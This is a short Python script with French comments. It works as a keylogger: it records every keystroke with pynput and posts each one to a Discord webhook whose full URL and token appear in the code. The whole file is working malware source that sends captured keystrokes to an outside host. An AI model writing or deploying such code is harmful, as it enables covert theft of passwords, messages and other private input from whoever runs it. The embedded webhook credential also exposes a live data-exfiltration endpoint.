from pynput import keyboard
import requests

# URL du webhook Discord
webhook_url = 'https://discord.com/api/webhooks/1245446274334068839/WBw1Hw0q1-kfuP2OOlzWYqaaN7eeM6b6DfT_duXbZHsC6sGSmpPIkDHVUrAUiwSoQbD1'

def on_press(key):
    try:
        key_str = key.char
    except AttributeError:
        key_str = str(key)

    print(f'Touche pressée : {key_str}')
    data = {
        'content': f'Touche pressée : {key_str}'
    }
    try:
        response = requests.post(webhook_url, json=data)
        response.raise_for_status()  # Vérifie que la requête a réussi
    except requests.exceptions.RequestException as e:
        print(f"Erreur lors de l'envoi de la requête : {e}")

def on_release(key):
    print(f'Touche relâchée : {key}')
    if key == keyboard.Key.esc:
        # Arrête l'écoute lors de l'appui sur la touche 'esc'
        return False

# Commence à écouter les événements clavier
with keyboard.Listener(
        on_press=on_press,
        on_release=on_release) as listener:
    listener.join()
